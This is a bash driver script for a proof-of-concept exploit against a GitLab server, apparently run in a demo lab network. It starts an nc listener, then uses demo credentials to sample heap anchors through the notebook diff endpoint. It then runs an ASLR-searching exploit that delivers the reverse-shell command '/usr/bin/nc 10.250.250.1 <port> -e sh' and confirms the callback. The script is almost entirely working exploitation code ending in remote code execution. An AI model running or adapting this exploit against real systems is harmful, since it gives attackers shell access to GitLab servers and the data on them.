#!/usr/bin/env bash

set -Eeuo pipefail

here=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
poc="$here/poc.pyz"
table="$here/table.json"
credentials="$here/.demo-credentials.json"
target="127.0.0.1:18935"
gateway="10.250.250.1"
mode="${1:-}"
port="${2:-4555}"

case "$port" in
    *[!0-9]*|'') printf '[error] port must be an integer\n' >&2; exit 2 ;;
esac
if ((port < 1 || port > 65535)); then
    printf '[error] port must be between 1 and 65535\n' >&2
    exit 2
fi

if [[ "$mode" == "listen" && -z "${TMUX:-}" ]] && command -v tmux >/dev/null 2>&1; then
    session="df-oj-listener-$port"
    printf -v listener_command '%q %q %q' "$here/run_poc.sh" "_listen" "$port"
    if ! env TERM=xterm-256color tmux has-session -t "$session" 2>/dev/null; then
        env TERM=xterm-256color tmux new-session -d -s "$session" "$listener_command"
        env TERM=xterm-256color tmux set-option -t "$session" status off
    fi
    printf '[listener] attaching to persistent tmux session: %s\n' "$session"
    printf '[listener] if SSH disconnects, run this command again to reattach\n'
    exec env TERM=xterm-256color tmux attach-session -t "$session"
fi

if [[ "$mode" == "listen" ]]; then
    if [[ -z "${TMUX:-}" ]]; then
        printf '[listener] tmux is unavailable; the listener will end with this SSH session\n' >&2
    fi
    mode="_listen"
fi

if [[ "$mode" == "_listen" ]]; then
    for program in ip nc; do
        command -v "$program" >/dev/null 2>&1 || {
            printf '[error] missing required command: %s\n' "$program" >&2
            exit 1
        }
    done
    printf '[listener] waiting for the fixed demo network at %s\n' "$gateway"
    while ! ip -4 -o address show | grep -Fq " $gateway/"; do
        sleep 1
    done
    printf '[listener] callback endpoint: %s:%s\n\n' "$gateway" "$port"
    trap 'printf "\n[listener] stopped\n"; exit 130' INT TERM
    while true; do
        if nc -lvn "$gateway" "$port"; then
            status=0
        else
            status=$?
        fi
        printf '\n[listener] nc exited with status %s; reopening the listener\n' "$status"
        sleep 1
    done
fi

if [[ "$mode" != "exploit" ]]; then
    printf 'usage: %s {listen|exploit} [port]\n' "$0" >&2
    exit 2
fi

for program in python3 git ss; do
    command -v "$program" >/dev/null 2>&1 || {
        printf '[error] missing required command: %s\n' "$program" >&2
        exit 1
    }
done
if [[ ! -f "$credentials" ]]; then
    printf '[error] run ./setup_env.sh first\n' >&2
    exit 1
fi

while ! ss -Hltn sport = ":$port" | grep -Fq "$gateway:$port"; do
    printf '[waiting] start ./run_poc.sh listen %s in the other terminal\n' "$port"
    sleep 2
done

readarray -t fields < <(python3 -c \
    'import json,sys; d=json.load(open(sys.argv[1])); print(d["login"]); print(d["password"]); print(d["pat"])' \
    "$credentials")
login="${fields[0]}"
password="${fields[1]}"
pat="${fields[2]}"

umask 077
anchor_log=$(mktemp "${TMPDIR:-/tmp}/df-offline-anchor.XXXXXX")
cleanup() { rm -f -- "$anchor_log"; }
trap cleanup EXIT

printf '\n[1/2] Sampling five heap anchors through the notebook diff endpoint\n'
anchor_samples=()
for anchor_sample in 1 2 3 4 5; do
    anchor=""
    for anchor_attempt in 1 2 3; do
        if DF_GITLAB_PAT="$pat" \
            DF_GITLAB_PASSWORD="$password" \
            DF_GITLAB_LOGIN="$login" \
            python3 -S "$poc" anchor \
                --host "$target" \
                --delta-lo-mib 2450 \
                --delta-hi-mib 2480 2>&1 | tee "$anchor_log"; then
            anchor=$(python3 -c \
                'import json,sys; rows=[json.loads(x[7:]) for x in open(sys.argv[1]) if x.startswith("ANCHOR ")]; print(rows[0]["anchor"] if len(rows) == 1 else "")' \
                "$anchor_log")
            if [[ "$anchor" =~ ^0x[0-9a-fA-F]+$ ]]; then
                break
            fi
        fi
        anchor=""
        if ((anchor_attempt < 3)); then
            printf '[retry] heap-anchor batch %s attempt %s/3 was inconclusive\n' \
                "$anchor_sample" "$anchor_attempt"
            sleep 1
        fi
    done
    if [[ -z "$anchor" ]]; then
        printf '[error] heap-anchor batch %s failed after 3 attempts\n' \
            "$anchor_sample" >&2
        exit 1
    fi
    anchor_samples+=("$anchor")
    printf '[sample] heap anchor %s/5: %s\n' "$anchor_sample" "$anchor"
done
anchor=$(python3 - "${anchor_samples[@]}" <<'PY'
import sys

values = sorted(int(value, 16) for value in sys.argv[1:])
assert len(values) == 5
print(hex(values[len(values) // 2]))
PY
)
printf '[aggregate] median heap anchor: %s\n' "$anchor"

callback_command="/usr/bin/nc $gateway $port -e sh"
callback_check="ss -Htn state established sport = ':$port' | grep -Fq '$gateway:$port'"
if ((${#callback_command} >= 40)); then
    printf '[error] callback command exceeds the parser command budget\n' >&2
    exit 1
fi

printf '\n[2/2] Loading the frozen table, searching ASLR, and delivering the callback\n'
DF_GITLAB_PAT="$pat" \
DF_GITLAB_PASSWORD="$password" \
DF_GITLAB_LOGIN="$login" \
DF_OFFLINE_TABLE="$table" \
python3 -S "$poc" exploit \
    --host "$target" \
    --anchor "$anchor" \
    --request-timeout 8 \
    --cleanup-probes 2048 \
    --final-fires 2 \
    --search-priors-mb "${DF_SEARCH_PRIORS_MIB:-2470.876,2475.255,2471.816,2470.832,2474.575,2469.155,2477.060,2468.214,2472.011,2470.518,2473.553,2461.030,2470.578,2472.993,2474.881,2471.986,2472.771,2472.715,2457.999,2463.459,2466.280,2467.435,2470.888,2472.361,2470.845,2470.731,2469.958,2476.474,2459.778,2470.052,2470.103,2474.941,2467.202,2475.117,2465.059}" \
    --delta-lo-mb 2450 \
    --delta-hi-mb 2480 \
    --command "$callback_command" \
    --check-command "$callback_check"

if ss -Htn state established sport = ":$port" | grep -Fq "$gateway:$port"; then
    printf '\n[success] the GitLab worker connected to the external listener\n'
    printf '[success] switch to the listener terminal and run: id\n'
else
    printf '[error] exploit exited without an established callback\n' >&2
    exit 1
fi
